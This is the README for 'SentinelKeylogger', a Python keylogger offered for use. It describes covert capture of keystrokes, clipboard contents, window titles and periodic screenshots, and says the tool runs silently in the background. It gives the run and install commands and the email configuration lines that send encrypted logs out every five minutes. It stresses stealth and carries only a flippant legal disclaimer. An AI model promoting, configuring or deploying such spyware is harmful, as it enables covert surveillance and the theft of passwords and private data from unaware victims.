# SentinelKeylogger – Single File Edition

> A lightweight, stealthy, and cross-platform Python keylogger for educational and authorized testing use only.

---

## 🧠 What is This?

SentinelKeylogger (Single File Edition) is a compact yet capable keylogger designed to:

- 🧠 Log keystrokes with timestamps  
- 📋 Monitor clipboard contents  
- 🪟 Track active window titles  
- 📸 Capture periodic screenshots  
- 🔐 Encrypt logs and email them securely

---

## 🚀 How to Use

### ▶️ Run the keylogger:
```bash
python SentinelKeylogger_SingleFile.py
```

This will start:

- Keystroke logging  
- Clipboard watcher  
- Window title tracker  
- Screenshot capture every 30 seconds  
- Encrypted log emailing every 5 minutes

> 💡 It runs **in the background** and continues silently.

---

## ⚙️ Configuration

Edit the following lines in the script to configure your email sender:

```python
msg["From"] = "youremail@example.com"
msg["To"] = "youremail@example.com"
server.login("youremail@example.com", "your_app_password")
```

You must enable **"App Passwords"** in your email provider (e.g., Gmail) to use this feature.

---

## 📂 Output

- 🔑 `log.txt` – Collected and timestamped data  
- 📸 `screens/` – Periodically saved screenshots  
- 🔒 `key.key` – AES encryption key used for secure email delivery

---

## 🧰 Requirements

Install the required libraries:

```bash
pip install pynput pyperclip pyautogui psutil pygetwindow cryptography pillow
```

> 💡 On Linux/macOS, ensure `xclip`, `x11-utils`, or related clipboard/window libraries are installed.

---

## ⚠️ Legal Disclaimer !!!!!:))))))

This tool is intended **strictly for educational use**, penetration testing with proper authorization, or Red Team simulation in lab environments.

> **Using this tool without proper authorization is illegal.**

The author assumes **no responsibility** for any misuse.

---

Crafted for simplicity and stealth. Use ethically. 🧠
